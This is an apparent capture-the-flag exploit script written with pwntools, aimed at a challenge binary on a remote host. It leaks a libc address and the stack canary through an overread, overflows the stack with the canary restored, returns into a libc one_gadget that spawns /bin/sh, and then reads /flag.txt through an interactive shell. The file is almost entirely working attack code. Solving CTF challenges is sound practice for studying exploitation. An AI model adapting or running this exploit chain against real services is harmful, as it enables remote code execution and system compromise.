from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./ld-linux-x86-64.so.2"
elf = ELF(vuln_path)
libc = ELF("./libc.so.6")

io = process([vuln_path, "./chall"]) if not f_remote else remote("34.45.81.67", 16006)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()



payload = b""
io.sendlineafter("CHUNK 1 100      ", "CHUNKS 10")

payload = b"a" * 0x58
io.sendafter("set nthread to ", b"CHUNK 9999 1 " + payload)
leak = u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))
libc.address = leak - 0x9caa4
log.success("libc.address :-----> " + hex(libc.address))


# leak canary
payload = b"a" * 0x48
io.sendline(b"CHUNK 9999 1 " + payload)

io.recvuntil("\x61"*0x48)
canary = u64(io.recv(8)) - 0xa
log.success("canary:-----> " + hex(canary))


one_gadge = [0x583ec, 0x583f3, 0xef4ce, 0xef52b]
one = one_gadge[0] 
payload = b"CHUNK 1 1 " + b"a" * 0x48 
payload += p64(canary) + p64(0)
payload += p64(libc.address+one)
ddebug("break *0x40126B\n break *0x04011F1\n continue")
io.sendline(payload)

"""
0x583ec posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
0x583f3 posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
0xef4ce execve("/bin/sh", rbp-0x50, r12)
0xef52b execve("/bin/sh", rbp-0x50, [rbp-0x78])
"""
sleep(2)
io.sendline(b"cat /flag.txt")
io.sendline(b"cat /flag.txt")
io.interactive()
